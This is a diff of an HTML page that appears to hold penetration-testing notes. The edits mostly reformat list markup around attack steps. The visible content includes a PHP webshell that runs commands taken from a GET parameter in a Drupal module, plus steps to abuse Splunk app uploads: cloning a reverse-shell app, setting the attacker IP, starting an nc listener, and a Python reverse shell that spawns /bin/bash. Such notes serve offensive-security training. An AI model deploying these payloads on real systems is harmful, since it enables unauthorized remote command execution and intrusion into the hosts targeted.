@@ -2341,15 +2341,15 @@
 <div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
 <span class="normal">2</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-27-1">wget<span class="w"> </span>--no-check-certificate<span class="w">  </span>https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
 </span><span id="__span-27-2">tar<span class="w"> </span>xvf<span class="w"> </span>captcha-8.x-1.2.tar.gz
-</span></code></pre></div></td></tr></table></div>
-Create a webshell file:
+</span></code></pre></div></td></tr></table></div></li>
+<li>Create a webshell file:
 <div class="language-php highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">PHP</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
 <span class="normal">2</span>
 <span class="normal">3</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-28-1"><span class="cp">&lt;?php</span>
 </span><span id="__span-28-2"><span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;fe8edbabc5c5c9b7b764504cd22b17af&#39;</span><span class="p">]);</span>
 </span><span id="__span-28-3"><span class="cp">?&gt;</span>
-</span></code></pre></div></td></tr></table></div>
-Create a .htaccess file to give ourselves access to the folder
+</span></code></pre></div></td></tr></table></div></li>
+<li>Create a .htaccess file to give ourselves access to the folder
 <div class="language-html highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">HTML</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
 <span class="normal">2</span>
 <span class="normal">3</span>
@@ -2655,23 +2655,26 @@ Create a .htaccess file to give ourselves access to the folder
 </ul>
 <h3 id="attacking-splunk">Attacking Splunk</h3>
 <h4 id="abusing-built-in-functionality_1">Abusing Built-In Functionality</h4>
-<p><strong>Windows Hosts</strong>
-- Clone reverse shell from GitHub
+<p><strong>Windows Hosts</strong></p>
+<ul>
+<li>Clone reverse shell from GitHub
 <div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-51-1">git<span class="w"> </span>clone<span class="w"> </span>https://github.com/0xjpuff/reverse_shell_splunk.git
-</span></code></pre></div></td></tr></table></div>
-- Edit attacker_ip_here and attacker_port_here in <code>reverse_shell_splunk/reverse_shell_splunk/bin/run.ps1</code>
-- Create tar ball of the directory
+</span></code></pre></div></td></tr></table></div></li>
+<li>Edit attacker_ip_here and attacker_port_here in <code>reverse_shell_splunk/reverse_shell_splunk/bin/run.ps1</code></li>
+<li>Create tar ball of the directory
 <div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
 <span class="normal">2</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-52-1"><span class="nb">cd</span><span class="w"> </span>reverse_shell_splunk
 </span><span id="__span-52-2">tar<span class="w"> </span>-cvzf<span class="w"> </span>updater.tar.gz<span class="w"> </span>reverse_shell_splunk/
-</span></code></pre></div></td></tr></table></div>
-- Start a listener
+</span></code></pre></div></td></tr></table></div></li>
+<li>Start a listener
 <div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-53-1">nc<span class="w"> </span>-nvlp<span class="w"> </span><span class="m">9001</span>
-</span></code></pre></div></td></tr></table></div>
-- In browser click <code>Apps &gt; Manage Apps(cog symbol) &gt; Install app from file</code>
-- <code>Browse</code> to select tar ball then click <code>Upload</code> this will trigger the reverse shell</p>
-<p><strong>Linux Hosts</strong>
-- Edit <code>rev.py</code> to:
+</span></code></pre></div></td></tr></table></div></li>
+<li>In browser click <code>Apps &gt; Manage Apps(cog symbol) &gt; Install app from file</code></li>
+<li><code>Browse</code> to select tar ball then click <code>Upload</code> this will trigger the reverse shell</li>
+</ul>
+<p><strong>Linux Hosts</strong></p>
+<ul>
+<li>Edit <code>rev.py</code> to:
 <div class="language-python highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Python</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
 <span class="normal">2</span>
 <span class="normal">3</span>
@@ -2687,7 +2690,8 @@ Create a .htaccess file to give ourselves access to the folder
 </span><span id="__span-54-6"><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span><span class="nb">int</span><span class="p">(</span><span class="n">port</span><span class="p">)))</span>
 </span><span id="__span-54-7"><span class="p">[</span><span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="n">fd</span><span class="p">)</span> <span class="k">for</span> <span class="n">fd</span> <span class="ow">in</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">)]</span>
 </span><span id="__span-54-8"><span class="n">pty</span><span class="o">.</span><span class="n">spawn</span><span class="p">(</span><span class="s1">&#39;/bin/bash&#39;</span><span class="p">)</span>
-</span></code></pre></div></td></tr></table></div></p>
+</span></code></pre></div></td></tr></table></div></li>
+</ul>
 
 
 
